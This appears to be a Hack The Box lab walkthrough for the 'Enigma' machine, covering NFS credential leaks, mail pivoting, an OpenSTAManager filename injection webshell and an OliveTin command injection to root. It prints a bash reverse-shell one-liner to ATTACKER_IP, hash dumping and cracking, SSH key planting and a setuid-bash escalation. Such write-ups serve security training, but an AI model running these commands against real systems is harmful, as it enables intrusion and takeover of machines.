# HTB Enigma — walkthrough & working scripts

**Target (this run):** `10.129.4.140` — `enigma.htb`
**Difficulty:** Easy · Linux · OpenSSH 9.6p1 / nginx 1.24.0 / Dovecot / NFS

> ⚠️ **Flags are per-instance.** The values you see in public write-ups belong to
> *other people's* instances and will NOT be accepted on your box. Credentials
> (below) are static for the machine, but `user.txt` / `root.txt` must be read
> from your own target.

## Attack chain

```
world-readable NFS share /srv/nfs/onboarding
  └─ New_Employee_Access.pdf  ──►  kevin : Enigma2024!   (webmail)
       └─ mail001.enigma.htb / IMAPS  ──► sarah reuses same password
            └─ sarah's inbox ──► support_001.enigma.htb  admin : Ne3s4rtars78s
                 └─ OpenSTAManager 2.9.8  P7M/ZIP filename injection  ──► www-data
                      └─ config.inc.php ──► brollin : Fri3nds@9099
                           └─ zz_users ──► haris bcrypt ──► crack ──► bestfriends
                                └─ su haris ──► /home/haris/user.txt   [USER]
                                     └─ 127.0.0.1:1337 OliveTin (root, guest exec)
                                          └─ db_pass injection ──► /tmp/rootbash -p
                                               └─ /root/root.txt       [ROOT]
```

## Static credentials

| Service | User | Password |
|---|---|---|
| Webmail / IMAP | `kevin` | `Enigma2024!` |
| Webmail / IMAP | `sarah` | `Enigma2024!` (reused) |
| OpenSTAManager admin | `admin` | `Ne3s4rtars78s` |
| MySQL (config.inc.php) | `brollin` | `Fri3nds@9099` |
| Linux user | `haris` | `bestfriends` (cracked from bcrypt) |

## Files

| File | Purpose |
|---|---|
| `01_enum.sh` | hosts entry, NFS export, mount, PDF extraction, mail hints |
| `03_p7m_exploit.py` | builds the malicious `exploit.zip` and triggers the webshell |
| `04_olivetin_inject.py` | OliveTin `db_pass` injection → root |

## Step by step

### 1. Recon
```bash
nmap -p- --min-rate 5000 -sCV -Pn 10.129.4.140
```
Open: 22, 80 (→ enigma.htb), 110/143/993/995 (Dovecot), 111 rpcbind, 2049 NFS.

### 2. NFS leak
```bash
./01_enum.sh 10.129.4.140
# or manually:
showmount -e 10.129.4.140
sudo mount -t nfs 10.129.4.140:/srv/nfs/onboarding /mnt/enigma -o nolock
pdftotext /mnt/enigma/New_Employee_Access.pdf -
```

> **If `mount -t nfs` fails with `access denied by server while mounting`:**
> `showmount -e` proves the server is reachable, so the refusal is from mountd.
> Causes: NFS version mismatch (mount.nfs defaults to **4.2**, the export is
> usually **3**) or the privileged-source-port requirement (`secure`, which
> WSL2's NFS client frequently trips over). Fixes, in order:
> ```bash
> # a) no mount at all - talk NFS directly with libnfs
> sudo apt install -y libnfs-utils poppler-utils
> nfs-ls  -D nfs://10.129.4.140
> nfs-ls     nfs://10.129.4.140/srv/nfs/onboarding
> nfs-cat    nfs://10.129.4.140/srv/nfs/onboarding/New_Employee_Access.pdf > /tmp/new.pdf
> pdftotext /tmp/new.pdf -
>
> # b) force version + reserved port
> sudo mount -t nfs -o vers=3,resvport,nolock,proto=tcp,mountproto=tcp,port=2049 \
>   10.129.4.140:/srv/nfs/onboarding /mnt/enigma
>
> # c) all of the above automatically
> ./02_nfs_fallback.sh 10.129.4.140
> ```
> If every attempt still says *access denied*, run the commands from a real
> Kali VM (VirtualBox/VMware) instead of WSL — WSL2's NFS client is the usual
> culprit for `illegal port` refusals.

> **If every attempt still says *access denied* (e.g. `MNT3ERR_ACCES`), the
> export uses `secure` and only accepts calls from a privileged source port
> (<1024) — WSL2's NFS client cannot do that.** In that case:
> 1. **Use the Windows NFS client** (works even though Linux side is WSL):
>    `Win+R` → `optionalfeatures` → enable *Services for NFS* → *Client for NFS*,
>    then in PowerShell (Admin):
>    ```powershell
>    mount -o anon \\10.129.4.140\srv\nfs\onboarding Z:
>    ```
>    Read `Z:\New_Employee_Access.pdf` from Windows, or `cp /mnt/z/New_Employee_Access.pdf .`
>    from WSL.
> 2. Run everything from a real Kali VM (VirtualBox/VMware) instead of WSL.
>
> Note: `mount.nfs`/`nfs-cat` must run with **`sudo`** — a reserved source port
> can only be bound by root. Running them as a normal user always yields
> `Permission denied`.

### 3. Mail pivot
```bash
openssl s_client -connect 10.129.4.140:993 -quiet
#   a1 LOGIN kevin Enigma2024!
#   a2 SELECT INBOX
#   a3 FETCH 1:* (BODY[TEXT])
# repeat with sarah / Enigma2024!  -> admin creds for support_001.enigma.htb
```
> `support_001.enigma.htb` has an underscore → glibc won't resolve it. Use
> `curl --resolve support_001.enigma.htb:80:10.129.4.140 ...` or a Burp
> Hostname Resolution Override.

### 4. Foothold
```bash
python3 03_p7m_exploit.py build
# upload exploit.zip: Purchases -> Purchase invoices -> Electronic invoicing
#                     -> Charge supplier document  (HTTP 500 expected)
python3 03_p7m_exploit.py trigger --ip 10.129.4.140 --cmd id      # uid=33(www-data)

# reverse shell
nc -lvnp 4444
python3 03_p7m_exploit.py trigger --ip 10.129.4.140 \
  --cmd "bash -c 'bash -i >%26 /dev/tcp/ATTACKER_IP/4444 0>%261'"
```

### 5. www-data → haris
```bash
cat /var/www/html/openstamanager/config.inc.php    # brollin / Fri3nds@9099
mysql -u brollin -p'Fri3nds@9099' -D openstamanager -e "SELECT username,password FROM zz_users;"
hashcat -m 3200 haris.hash /usr/share/wordlists/rockyou.txt     # -> bestfriends
su - haris            # bestfriends
cat ~/user.txt        # <-- USER FLAG
```

### 6. haris → root (OliveTin)
```bash
ss -tlnp | grep 1337                 # 127.0.0.1:1337
cat /etc/OliveTin/config.yaml
# stable shell as haris:
ssh-keygen -t ed25519 -f haris_key -N ''
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo '<haris_key.pub>' > ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
ssh -i haris_key haris@enigma.htb
# tunnel loopback service
ssh -i haris_key -L 1337:127.0.0.1:1337 haris@enigma.htb

python3 04_olivetin_inject.py \
  --cmd 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash'
/tmp/rootbash -p
cat /root/root.txt   # <-- ROOT FLAG
```

## Sources
- https://saksht.github.io/writeups/enigma/
- https://d4c4d1.github.io/posts/enigma-writeup-htb/
- https://xlondra.github.io/writeups/2026/Enigma/Enigma.html
- https://cberreteaga.github.io/htb-reports/reports/enigma.html
- https://b0f.ru/writeups/enigma-htb
